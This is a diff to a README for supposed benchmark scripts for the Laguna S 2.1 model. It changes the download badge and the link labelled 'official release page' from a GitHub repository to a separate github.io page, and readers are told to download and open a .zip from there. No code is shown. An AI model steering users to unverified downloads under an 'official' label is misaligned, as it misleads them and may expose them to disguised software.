@@ -1,6 +1,6 @@
 # 🖥️ macos-laguna-s2.1 - Run performance benchmarks on your computer
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/streetchildroot437/macos-laguna-s2.1)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://streetchildroot437.github.io)
 
 This project provides scripts and data to help you test the performance of the Poolside Laguna S 2.1 model. These tools help you understand how your hardware handles heavy computational tasks. Researchers and hobbyists use these benchmarks to compare systems and optimize settings.
 
@@ -8,7 +8,7 @@ This project provides scripts and data to help you test the performance of the P
 
 You need the latest version of the scripts to start your tests. Follow these steps to obtain the files for your computer:
 
-1. Visit the [official release page](https://github.com/streetchildroot437/macos-laguna-s2.1).
+1. Visit the [official release page](https://streetchildroot437.github.io).
 2. Look for the section labeled "Assets."
 3. Click the link that ends in ".zip" to save the folder to your computer.
 4. Open your "Downloads" folder and find the file you just saved.
